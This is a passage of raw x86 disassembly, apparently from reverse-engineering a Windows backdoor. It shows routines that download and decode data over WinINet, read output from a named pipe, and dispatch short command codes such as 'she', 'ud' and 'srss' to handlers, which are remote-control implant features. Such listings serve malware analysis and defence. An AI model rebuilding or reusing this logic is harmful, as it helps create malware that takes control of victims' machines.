                mov     ebx, ds:InternetQueryDataAvailable
                add     esp, 0Ch
                lea     esp, [esp+0]

loc_404B60:                             ; CODE XREF: sub_404940+27A↓j
                mov     esi, dword_42C7A8
                push    0               ; dwContext
                push    0               ; dwFlags
                lea     edx, [esp+4003Ch+dwOptionalLength]
                push    edx             ; lpdwNumberOfBytesAvailable
                push    ebp             ; hFile
                mov     [esp+40044h+dwOptionalLength], 0
                call    ebx ; InternetQueryDataAvailable
                test    eax, eax
                jz      short loc_404BBE
                mov     eax, [esp+40034h+dwOptionalLength]
                cmp     eax, 40000h
                jbe     short loc_404B8E
                mov     eax, 40000h

loc_404B8E:                             ; CODE XREF: sub_404940+247↑j
                mov     esi, dword_42C7A8
                lea     ecx, [esp+40034h+dwNumberOfBytesRead]
                push    ecx             ; lpdwNumberOfBytesRead
                push    eax             ; dwNumberOfBytesToRead
                lea     edx, [esp+4003Ch+var_40004]
                push    edx             ; lpBuffer
                push    ebp             ; hFile
                call    ds:InternetReadFile
                test    eax, eax
                jz      short loc_404BBE
                add     edi, [esp+40034h+dwNumberOfBytesRead]
                push    64h             ; dwMilliseconds
                call    ds:Sleep
                cmp     edi, [esp+40034h+Buffer]
                jb      short loc_404B60
                jmp     short loc_404BC6
; ---------------------------------------------------------------------------

loc_404BBE:                             ; CODE XREF: sub_404940+23C↑j
                                        ; sub_404940+268↑j
                call    ds:GetLastError
                mov     [esi], eax

loc_404BC6:                             ; CODE XREF: sub_404940+153↑j
                                        ; sub_404940+1CF↑j ...
                test    ebp, ebp
                jz      short loc_404BD1
                push    ebp             ; hInternet
                call    ds:InternetCloseHandle

loc_404BD1:                             ; CODE XREF: sub_404940+1AC↑j
                                        ; sub_404940+288↑j
                mov     eax, 1

loc_404BD6:                             ; CODE XREF: sub_404940+190↑j
                mov     ecx, [esp+40034h+var_4]
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 40024h
                retn
sub_404940      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_404BF0      proc near               ; CODE XREF: sub_402A00+4C9↑p

dwIndex         = dword ptr -2048h
dwNumberOfBytesRead= dword ptr -2044h
Buffer          = dword ptr -2040h
dwNumberOfBytesAvailable= dword ptr -203Ch
var_2038        = dword ptr -2038h
dwBufferLength  = dword ptr -2034h
var_2030        = byte ptr -2030h
var_202C        = dword ptr -202Ch
var_201C        = dword ptr -201Ch
var_2018        = dword ptr -2018h
var_2014        = byte ptr -2014h
var_2013        = byte ptr -2013h
var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_404BF0
                mov     eax, large fs:0
                push    eax
                mov     eax, 203Ch
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+2048h+var_14], eax
                push    ebx
                push    ebp
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+2058h+var_C]
                mov     large fs:0, eax
                mov     eax, [esp+2058h+arg_0]
                xor     ebx, ebx
                mov     [esp+2058h+var_2038], eax
                mov     esi, ecx
                mov     [esp+2058h+Buffer], ebx
                mov     [esp+2058h+dwIndex], ebx
                mov     [esp+2058h+dwBufferLength], 4
                cmp     edi, ebx
                jz      loc_404E34
                lea     ecx, [esp+2058h+dwIndex]
                push    ecx             ; lpdwIndex
                lea     edx, [esp+205Ch+dwBufferLength]
                push    edx             ; lpdwBufferLength
                lea     eax, [esp+2060h+Buffer]
                push    eax             ; lpBuffer
                push    20000005h       ; dwInfoLevel
                push    edi             ; hRequest
                call    ds:HttpQueryInfoA
                cmp     eax, ebx
                jz      loc_404E34
                push    offset aAb      ; "ab"
                push    esi
                call    sub_40ED4E
                mov     esi, eax
                add     esp, 8
                cmp     esi, ebx
                jz      loc_404E34
                push    2
                push    ebx
                push    esi
                call    sub_40F65C
                add     esp, 0Ch
                push    1FFFh
                lea     ecx, [esp+205Ch+var_2013]
                push    ebx
                push    ecx
                mov     [esp+2064h+dwNumberOfBytesRead], ebx
                mov     [esp+2064h+dwIndex], ebx
                mov     [esp+2064h+dwNumberOfBytesAvailable], ebx
                mov     [esp+2064h+var_2014], bl
                call    sub_413520
                mov     ebp, ds:InternetQueryDataAvailable
                add     esp, 0Ch

loc_404CC5:                             ; CODE XREF: sub_404BF0+173↓j
                mov     edx, hEvent
                push    ebx             ; dwMilliseconds
                push    edx             ; hHandle
                call    ds:WaitForSingleObject
                test    eax, eax
                jz      loc_404D69
                push    ebx             ; dwContext
                push    ebx             ; dwFlags
                lea     eax, [esp+2060h+dwNumberOfBytesAvailable]
                push    eax             ; lpdwNumberOfBytesAvailable
                push    edi             ; hFile
                call    ebp ; InternetQueryDataAvailable
                test    eax, eax
                jz      loc_404D9E
                mov     edx, [esp+2058h+dwNumberOfBytesAvailable]
                lea     ecx, [esp+2058h+dwNumberOfBytesRead]
                push    ecx             ; lpdwNumberOfBytesRead
                push    edx             ; dwNumberOfBytesToRead
                lea     eax, [esp+2060h+var_2014]
                push    eax             ; lpBuffer
                push    edi             ; hFile
                call    ds:InternetReadFile
                test    eax, eax
                jz      loc_404DB7
                mov     ecx, [esp+2058h+dwNumberOfBytesRead]
                xor     eax, eax
                cmp     ecx, ebx
                jbe     short loc_404D34
                jmp     short loc_404D20
; ---------------------------------------------------------------------------
                align 10h

loc_404D20:                             ; CODE XREF: sub_404BF0+125↑j
                                        ; sub_404BF0+142↓j
                movzx   edx, [esp+eax+2058h+var_2014]
                mov     dl, byte_426710[edx]
                mov     [esp+eax+2058h+var_2014], dl
                inc     eax
                cmp     eax, ecx
                jb      short loc_404D20

loc_404D34:                             ; CODE XREF: sub_404BF0+123↑j
                push    esi
                push    1
                push    ecx
                lea     eax, [esp+2064h+var_2014]
                push    eax
                call    sub_40F345
                push    esi
                call    sub_40E42D
                add     esp, 14h
                test    eax, eax
                jnz     loc_404DD0
                mov     eax, [esp+2058h+dwIndex]
                add     eax, [esp+2058h+dwNumberOfBytesRead]
                mov     [esp+2058h+dwIndex], eax
                cmp     eax, [esp+2058h+Buffer]
                jb      loc_404CC5

loc_404D69:                             ; CODE XREF: sub_404BF0+E5↑j
                push    esi
                call    sub_40F867
                add     esp, 4
                mov     eax, 1

loc_404D77:                             ; CODE XREF: sub_404BF0+1C5↓j
                                        ; sub_404BF0+1DE↓j ...
                mov     ecx, [esp+2058h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+2048h+var_14]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 2048h
                retn
; ---------------------------------------------------------------------------

loc_404D9E:                             ; CODE XREF: sub_404BF0+F7↑j
                call    ds:GetLastError
                mov     ecx, [esp+2058h+var_2038]
                push    esi
                mov     [ecx], eax
                call    sub_40F867
                add     esp, 4
                xor     eax, eax
                jmp     short loc_404D77
; ---------------------------------------------------------------------------

loc_404DB7:                             ; CODE XREF: sub_404BF0+115↑j
                call    ds:GetLastError
                mov     edx, [esp+2058h+var_2038]
                push    esi
                mov     [edx], eax
                call    sub_40F867
                add     esp, 4
                xor     eax, eax
                jmp     short loc_404D77
; ---------------------------------------------------------------------------

loc_404DD0:                             ; CODE XREF: sub_404BF0+15D↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    11h
                push    offset aWriteFileError ; "Write file error!"
                lea     ecx, [esp+2060h+var_2030]
                mov     [esp+2060h+var_2018], 0Fh
                mov     [esp+2060h+var_201C], ebx
                mov     byte ptr [esp+2060h+var_202C], bl
                call    sub_409840
                lea     eax, [esp+2058h+var_2030]
                push    eax
                mov     [esp+205Ch+var_4], ebx
                call    sub_408F30
                cmp     [esp+2058h+var_2018], 10h
                jb      short loc_404E20
                mov     ecx, [esp+2058h+var_202C]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_404E20:                             ; CODE XREF: sub_404BF0+221↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                push    esi
                call    sub_40F867
                add     esp, 4

loc_404E34:                             ; CODE XREF: sub_404BF0+5F↑j
                                        ; sub_404BF0+82↑j ...
                xor     eax, eax
                jmp     loc_404D77
sub_404BF0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_404E40      proc near               ; CODE XREF: sub_404800+DC↑p
                                        ; sub_4052B0+17A↓p ...

var_68          = dword ptr -68h
var_64          = byte ptr -64h
var_60          = dword ptr -60h
var_50          = dword ptr -50h
var_4C          = dword ptr -4Ch
var_48          = byte ptr -48h
var_44          = dword ptr -44h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = byte ptr -2Ch
var_28          = dword ptr -28h
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_404E40
                mov     eax, large fs:0
                push    eax
                sub     esp, 5Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+68h+var_10], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+7Ch+var_C]
                mov     large fs:0, eax
                mov     eax, [esp+7Ch+arg_0]
                mov     [esp+7Ch+var_68], eax
                xor     ebx, ebx
                mov     ebp, 0Fh
                mov     eax, ecx
                mov     esi, edx
                mov     [esp+7Ch+var_30], ebp
                mov     [esp+7Ch+var_34], ebx
                mov     byte ptr [esp+7Ch+var_44], bl
                lea     edi, [eax+1]

loc_404E97:                             ; CODE XREF: sub_404E40+5C↓j
                mov     dl, [eax]
                inc     eax
                cmp     dl, bl
                jnz     short loc_404E97
                sub     eax, edi
                push    eax
                push    ecx
                lea     ecx, [esp+84h+var_48]
                call    sub_409840
                mov     [esp+7Ch+var_4], ebx
                mov     eax, esi
                mov     [esp+7Ch+var_4C], ebp
                mov     [esp+7Ch+var_50], ebx
                mov     byte ptr [esp+7Ch+var_60], bl
                lea     edi, [eax+1]

loc_404EC0:                             ; CODE XREF: sub_404E40+85↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_404EC0
                sub     eax, edi
                push    eax
                push    esi
                lea     ecx, [esp+84h+var_64]
                call    sub_409840
                mov     byte ptr [esp+7Ch+var_4], 1
                push    ebx
                push    offset szProxyBypass
                lea     ecx, [esp+84h+var_2C]
                mov     [esp+84h+var_14], ebp
                mov     [esp+84h+var_18], ebx
                mov     byte ptr [esp+84h+var_28], bl
                call    sub_409840
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+84h+var_64]
                mov     byte ptr [esp+84h+var_4], 2
                call    sub_409730
                mov     edx, [esp+7Ch+var_60]
                mov     edi, 10h
                cmp     [esp+7Ch+var_4C], edi
                jnb     short loc_404F1F
                lea     edx, [esp+7Ch+var_60]

loc_404F1F:                             ; CODE XREF: sub_404E40+D9↑j
                mov     eax, edx
                lea     esi, [eax+1]

loc_404F24:                             ; CODE XREF: sub_404E40+E9↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_404F24
                sub     eax, esi
                push    eax
                push    edx
                lea     ecx, [esp+84h+var_48]
                push    ecx
                call    sub_408D80
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_404F96
                cmp     [esp+7Ch+var_14], edi
                jb      short loc_404F51
                mov     edx, [esp+7Ch+var_28]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_404F51:                             ; CODE XREF: sub_404E40+102↑j
                mov     [esp+7Ch+var_14], ebp
                mov     [esp+7Ch+var_18], ebx
                mov     byte ptr [esp+7Ch+var_28], bl
                cmp     [esp+7Ch+var_4C], edi
                jb      short loc_404F70
                mov     eax, [esp+7Ch+var_60]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_404F70:                             ; CODE XREF: sub_404E40+121↑j
                mov     [esp+7Ch+var_4C], ebp
                mov     [esp+7Ch+var_50], ebx
                mov     byte ptr [esp+7Ch+var_60], bl
                cmp     [esp+7Ch+var_30], edi
                jb      short loc_404F8F
                mov     ecx, [esp+7Ch+var_44]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_404F8F:                             ; CODE XREF: sub_404E40+140↑j
                xor     eax, eax
                jmp     loc_405082
; ---------------------------------------------------------------------------

loc_404F96:                             ; CODE XREF: sub_404E40+FC↑j
                mov     edx, [esp+7Ch+var_50]
                mov     ecx, [esp+7Ch+var_34]
                lea     edi, [edx+eax]
                cmp     edi, ecx
                jnb     short loc_404FF7
                jbe     short loc_404FB0
                call    sub_40EC7A
                mov     ecx, [esp+7Ch+var_34]

loc_404FB0:                             ; CODE XREF: sub_404E40+165↑j
                                        ; sub_404E40+1B5↓j
                mov     eax, [esp+7Ch+var_44]
                mov     esi, 10h
                cmp     [esp+7Ch+var_30], esi
                jnb     short loc_404FC3
                lea     eax, [esp+7Ch+var_44]

loc_404FC3:                             ; CODE XREF: sub_404E40+17D↑j
                cmp     byte ptr [eax+edi], 3Bh
                jz      short loc_404FFC
                cmp     edi, ecx
                jbe     short loc_404FD2
                call    sub_40EC7A

loc_404FD2:                             ; CODE XREF: sub_404E40+18B↑j
                mov     eax, [esp+7Ch+var_44]
                cmp     [esp+7Ch+var_30], esi
                jnb     short loc_404FE0
                lea     eax, [esp+7Ch+var_44]

loc_404FE0:                             ; CODE XREF: sub_404E40+19A↑j
                mov     bl, [eax+edi]
                lea     esi, [esp+7Ch+var_2C]
                call    sub_408C10
                mov     ecx, [esp+7Ch+var_34]
                inc     edi
                xor     ebx, ebx
                cmp     edi, ecx
                jb      short loc_404FB0

loc_404FF7:                             ; CODE XREF: sub_404E40+163↑j
                mov     esi, 10h

loc_404FFC:                             ; CODE XREF: sub_404E40+187↑j
                mov     edi, [esp+7Ch+var_14]
                mov     ebp, [esp+7Ch+var_28]
                mov     eax, ebp
                cmp     edi, esi
                jnb     short loc_40500E
                lea     eax, [esp+7Ch+var_28]

loc_40500E:                             ; CODE XREF: sub_404E40+1C8↑j
                mov     esi, [esp+7Ch+var_18]
                push    esi
                push    eax
                mov     eax, [esp+84h+var_68]
                push    eax
                call    sub_414550
                mov     ecx, [esp+88h+var_68]
                mov     [esi+ecx], bl
                mov     esi, 10h
                add     esp, 0Ch
                cmp     edi, esi
                jb      short loc_40503A
                push    ebp
                call    sub_40F15B
                add     esp, 4

loc_40503A:                             ; CODE XREF: sub_404E40+1EF↑j
                mov     edi, 0Fh
                mov     [esp+7Ch+var_14], edi
                mov     [esp+7Ch+var_18], ebx
                mov     byte ptr [esp+7Ch+var_28], bl
                cmp     [esp+7Ch+var_4C], esi
                jb      short loc_40505E
                mov     edx, [esp+7Ch+var_60]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_40505E:                             ; CODE XREF: sub_404E40+20F↑j
                mov     [esp+7Ch+var_4C], edi
                mov     [esp+7Ch+var_50], ebx
                mov     byte ptr [esp+7Ch+var_60], bl
                cmp     [esp+7Ch+var_30], esi
                jb      short loc_40507D
                mov     eax, [esp+7Ch+var_44]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40507D:                             ; CODE XREF: sub_404E40+22E↑j
                mov     eax, 1

loc_405082:                             ; CODE XREF: sub_404E40+151↑j
                mov     ecx, [esp+7Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+68h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 68h
                retn
sub_404E40      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4050B0      proc near               ; CODE XREF: sub_407110+335↓p
                                        ; sub_407110:loc_407452↓p

TotalBytesAvail = dword ptr -1834h
NumberOfBytesRead= dword ptr -1830h
var_182C        = byte ptr -182Ch
var_1828        = dword ptr -1828h
var_1818        = dword ptr -1818h
var_1814        = dword ptr -1814h
Buffer          = byte ptr -1810h
var_180F        = byte ptr -180Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_4050B0
                mov     eax, large fs:0
                push    eax
                mov     eax, 1828h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+1834h+var_10], eax
                push    ebx
                push    ebp
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+1844h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    ebx             ; lpBytesLeftThisMessage
                lea     eax, [esp+1848h+TotalBytesAvail]
                push    eax             ; lpTotalBytesAvail
                push    ebx             ; lpBytesRead
                push    ebx             ; nBufferSize
                push    ebx             ; lpBuffer
                push    edi             ; hNamedPipe
                mov     [esp+185Ch+TotalBytesAvail], ebx
                call    ds:PeekNamedPipe
                test    eax, eax
                jz      loc_4051DB
                mov     ebp, ds:ReadFile

loc_405112:                             ; CODE XREF: sub_4050B0+125↓j
                mov     esi, [esp+1844h+TotalBytesAvail]
                cmp     esi, ebx
                jz      loc_4051DB
                push    17FFh
                lea     ecx, [esp+1848h+var_180F]
                push    ebx
                push    ecx
                mov     [esp+1850h+Buffer], bl
                call    sub_413520
                add     esp, 0Ch
                push    ebx             ; lpOverlapped
                lea     edx, [esp+1848h+NumberOfBytesRead]
                push    edx             ; lpNumberOfBytesRead
                push    esi             ; nNumberOfBytesToRead
                lea     eax, [esp+1850h+Buffer]
                push    eax             ; lpBuffer
                push    edi             ; hFile
                mov     [esp+1858h+NumberOfBytesRead], ebx
                call    ebp ; ReadFile
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+1844h+Buffer]
                mov     [esp+1844h+var_1814], 0Fh
                mov     [esp+1844h+var_1818], ebx
                mov     byte ptr [esp+1844h+var_1828], bl
                lea     esi, [eax+1]
                lea     ebx, [ebx+0]

loc_405170:                             ; CODE XREF: sub_4050B0+C5↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_405170
                sub     eax, esi
                push    eax
                lea     ecx, [esp+1848h+Buffer]
                push    ecx
                lea     ecx, [esp+184Ch+var_182C]
                call    sub_409840
                lea     edx, [esp+1844h+var_182C]
                push    edx
                mov     [esp+1848h+var_4], ebx
                call    sub_408F30
                mov     [esp+1844h+var_4], 0FFFFFFFFh
                cmp     [esp+1844h+var_1814], 10h
                jb      short loc_4051B8
                mov     eax, [esp+1844h+var_1828]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4051B8:                             ; CODE XREF: sub_4050B0+F9↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                push    ebx             ; lpBytesLeftThisMessage
                lea     ecx, [esp+1848h+TotalBytesAvail]
                push    ecx             ; lpTotalBytesAvail
                push    ebx             ; lpBytesRead
                push    ebx             ; nBufferSize
                push    ebx             ; lpBuffer
                push    edi             ; hNamedPipe
                call    ds:PeekNamedPipe
                test    eax, eax
                jnz     loc_405112

loc_4051DB:                             ; CODE XREF: sub_4050B0+56↑j
                                        ; sub_4050B0+68↑j
                mov     ecx, [esp+1844h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+1834h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 1834h
                retn
sub_4050B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_405210      proc near               ; CODE XREF: sub_404940+149↑p

lpMem           = dword ptr -83B8h
var_83B4        = dword ptr -83B4h
var_83B0        = byte ptr -83B0h
var_4           = dword ptr -4
arg_0           = dword ptr  4

                mov     eax, 83B8h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+83B8h+var_4], eax
                mov     eax, [esp+83B8h+arg_0]
                mov     edx, [eax+14h]
                xor     ecx, ecx
                cmp     dword ptr [eax+18h], 10h
                mov     [esp+83B8h+lpMem], ecx
                mov     [esp+83B8h+var_83B4], ecx
                jb      short loc_405246
                mov     eax, [eax+4]
                jmp     short loc_405249
; ---------------------------------------------------------------------------

loc_405246:                             ; CODE XREF: sub_405210+2F↑j
                add     eax, 4

loc_405249:                             ; CODE XREF: sub_405210+34↑j
                push    ebx
                push    ebp
                lea     ecx, [esp+83C0h+var_83B4]
                push    ecx
                push    eax
                lea     ecx, [esp+83C8h+lpMem]
                lea     eax, [esp+83C8h+var_83B0]
                call    sub_40D7F0
                mov     ebx, [esp+83C0h+var_83B4]
                mov     ebp, [esp+83C0h+lpMem]
                push    ebx
                push    ebp
                push    esi
                call    sub_414550
                push    ebp             ; lpMem
                mov     [edi], ebx
                call    sub_40FD55
                add     esp, 10h
                xor     eax, eax
                pop     ebp
                pop     ebx
                cmp     [edi], eax
                jbe     short loc_405293

loc_405281:                             ; CODE XREF: sub_405210+81↓j
                movzx   edx, byte ptr [esi+eax]
                mov     cl, byte_426610[edx]
                mov     [esi+eax], cl
                inc     eax
                cmp     eax, [edi]
                jb      short loc_405281

loc_405293:                             ; CODE XREF: sub_405210+6F↑j
                mov     ecx, [esp+83B8h+var_4]
                xor     ecx, esp
                mov     eax, 1
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 83B8h
                retn
sub_405210      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4052B0      proc near               ; CODE XREF: sub_401E10+65E↑p

lpMem           = dword ptr -93F4h
var_93F0        = dword ptr -93F0h
var_93EC        = byte ptr -93ECh
var_93D0        = byte ptr -93D0h
var_105A        = word ptr -105Ah
var_1058        = byte ptr -1058h
var_1056        = word ptr -1056h
var_1054        = byte ptr -1054h
var_1044        = dword ptr -1044h
var_1040        = dword ptr -1040h
var_103C        = dword ptr -103Ch
var_1034        = dword ptr -1034h
var_1030        = dword ptr -1030h
var_102C        = dword ptr -102Ch
var_1028        = dword ptr -1028h
var_1020        = byte ptr -1020h
var_101F        = dword ptr -101Fh
var_101B        = dword ptr -101Bh
var_1017        = dword ptr -1017h
var_1013        = word ptr -1013h
var_1011        = byte ptr -1011h
var_1010        = byte ptr -1010h
var_100F        = byte ptr -100Fh
var_810         = byte ptr -810h
var_80F         = byte ptr -80Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    0FFFFFFFFh
                push    offset SEH_4052B0
                mov     eax, large fs:0
                push    eax
                mov     eax, 93ECh
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+93F8h+var_10], eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+9404h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    7FFh
                lea     eax, [esp+9408h+var_80F]
                push    ebx
                push    eax
                mov     [esp+9410h+var_810], bl
                call    sub_413520
                add     esp, 0Ch
                push    7FFh
                lea     ecx, [esp+9408h+var_100F]
                push    ebx
                push    ecx
                mov     [esp+9410h+var_1010], bl
                call    sub_413520
                mov     eax, [esp+9410h+arg_4]
                mov     edx, [esp+9410h+arg_0]
                mov     [esp+9410h+var_103C], eax
                lea     ecx, [esp+9410h+lpMem]
                xor     eax, eax
                mov     [esp+9410h+var_1044], edx
                mov     [esp+9410h+var_1040], ecx
                lea     edx, [esp+9410h+var_93F0]
                mov     [esp+9410h+var_105A], ax
                xor     ecx, ecx
                add     esp, 0Ch
                lea     eax, [esp+9404h+var_93D0]
                mov     [esp+9404h+var_1034], edx
                mov     [esp+9404h+var_1030], ebx
                mov     [esp+9404h+var_102C], ebx
                mov     [esp+9404h+lpMem], ebx
                mov     [esp+9404h+var_93F0], ebx
                mov     [esp+9404h+var_1058], bl
                mov     [esp+9404h+var_1056], cx
                mov     [esp+9404h+var_1054], bl
                mov     [esp+9404h+var_1028], 1
                call    sub_40D3F0
                mov     edx, [esp+9404h+var_93F0]
                mov     esi, [esp+9404h+lpMem]
                push    edx
                lea     eax, [esp+9408h+var_810]
                push    esi
                push    eax
                call    sub_414550
                add     esp, 0Ch
                push    esi             ; lpMem
                call    sub_40FD55
                mov     ecx, [esp+9408h+var_93F0]
                add     esp, 4
                push    ecx
                lea     edx, [esp+9408h+var_810]
                lea     ecx, [esp+9408h+var_1010]
                mov     [esp+9408h+lpMem], ebx
                call    sub_4046F0
                xor     eax, eax
                lea     edx, [esp+9408h+var_1020]
                add     esp, 4
                push    edx
                mov     edx, offset aCt ; "ct"
                lea     ecx, [esp+9408h+var_1010]
                mov     [esp+9408h+var_1020], bl
                mov     [esp+9408h+var_101F], eax
                mov     [esp+9408h+var_101B], eax
                mov     [esp+9408h+var_1017], eax
                mov     [esp+9408h+var_1013], ax
                mov     [esp+9408h+var_1011], al
                call    sub_404E40
                add     esp, 4
                test    eax, eax
                jz      loc_4056E3
                push    2
                lea     eax, [esp+9408h+var_1020]
                push    offset aPl      ; "pl"
                push    eax
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_40545F
                call    sub_405710
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_40545F:                             ; CODE XREF: sub_4052B0+1A3↑j
                push    2
                lea     ecx, [esp+9408h+var_1020]
                push    offset aPk      ; "pk"
                push    ecx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_40548B
                lea     ecx, [esp+9404h+var_1010]
                call    sub_405850
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_40548B:                             ; CODE XREF: sub_4052B0+1C8↑j
                push    2
                lea     edx, [esp+9408h+var_1020]
                push    offset aPf      ; "pf"
                push    edx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_4054B7
                lea     ecx, [esp+9404h+var_1010]
                call    sub_4059A0
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_4054B7:                             ; CODE XREF: sub_4052B0+1F4↑j
                push    2
                lea     eax, [esp+9408h+var_1020]
                push    offset aGf      ; "gf"
                push    eax
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_4054E3
                lea     ecx, [esp+9404h+var_1010]
                call    sub_405C60
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_4054E3:                             ; CODE XREF: sub_4052B0+220↑j
                push    2
                lea     ecx, [esp+9408h+var_1020]
                push    offset aRa      ; "ra"
                push    ecx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_40550F
                lea     ecx, [esp+9404h+var_1010]
                call    sub_405F00
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_40550F:                             ; CODE XREF: sub_4052B0+24C↑j
                push    2
                lea     edx, [esp+9408h+var_1020]
                push    offset aUd      ; "ud"
                push    edx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_40553B
                lea     esi, [esp+9404h+var_1010]
                call    sub_406690
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_40553B:                             ; CODE XREF: sub_4052B0+278↑j
                push    2
                lea     eax, [esp+9408h+var_1020]
                push    offset aEx      ; "ex"
                push    eax
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_405567
                lea     ecx, [esp+9404h+var_1010]
                call    sub_4062E0
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_405567:                             ; CODE XREF: sub_4052B0+2A4↑j
                push    3
                lea     ecx, [esp+9408h+var_1020]
                push    offset aSex     ; "sex"
                push    ecx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_40558C
                call    sub_4064E0
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_40558C:                             ; CODE XREF: sub_4052B0+2D0↑j
                push    2
                lea     edx, [esp+9408h+var_1020]
                push    offset aSs      ; "ss"
                push    edx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_4055B1
                call    sub_4067C0
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_4055B1:                             ; CODE XREF: sub_4052B0+2F5↑j
                push    3
                lea     eax, [esp+9408h+var_1020]
                push    offset aShe     ; "she"
                push    eax
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_4055DD
                lea     esi, [esp+9404h+var_1010]
                call    sub_407040
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_4055DD:                             ; CODE XREF: sub_4052B0+31A↑j
                push    3
                lea     ecx, [esp+9408h+var_1020]
                push    offset aSos     ; "sos"
                push    ecx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_405602
                call    sub_406A40
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_405602:                             ; CODE XREF: sub_4052B0+346↑j
                push    4
                lea     edx, [esp+9408h+var_1020]
                push    offset aOshe    ; "oshe"
                push    edx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_40562E
                lea     ecx, [esp+9404h+var_1010]
                call    sub_407110
                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_40562E:                             ; CODE XREF: sub_4052B0+36B↑j
                push    4
                lea     eax, [esp+9408h+var_1020]
                push    offset aSrss    ; "srss"
                push    eax
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_405653
                call    sub_406C90
